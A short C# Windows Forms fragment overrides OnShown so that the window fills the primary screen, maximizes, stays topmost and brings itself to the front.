    protected override void OnShown(EventArgs e)
    {
        base.OnShown(e);
        Bounds = Screen.PrimaryScreen?.Bounds ?? Bounds;
        WindowState = FormWindowState.Maximized;
        TopMost = true;
        Activate();
        BringToFront();
    }
}
